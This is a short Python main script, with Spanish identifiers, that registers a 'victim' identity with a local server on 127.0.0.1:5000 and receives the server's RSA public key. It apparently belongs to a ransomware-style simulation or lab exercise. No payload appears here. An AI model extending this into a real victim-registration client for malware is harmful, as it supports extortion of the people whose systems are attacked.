
from victima.cliente import (
    preparar_identidad,
    conectar_y_registrar
)


def main():
    identidad = preparar_identidad()

    print("=== REGISTRO DE VICTIMA ===")
    print("Identificador:", identidad["idV"])

    try:
        resultado = conectar_y_registrar(
            identidad,
            host="127.0.0.1",
            puerto=5000
        )

    except (OSError, ValueError, RuntimeError) as error:
        print("Registro fallido:", error)
        return 1

    print("Registro confirmado")
    print("Respuesta:", resultado["respuesta"]["tipo"])

    clave = resultado["clave_publica_servidor"]
    print("Clave publica RSA:", clave.key_size, "bits")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
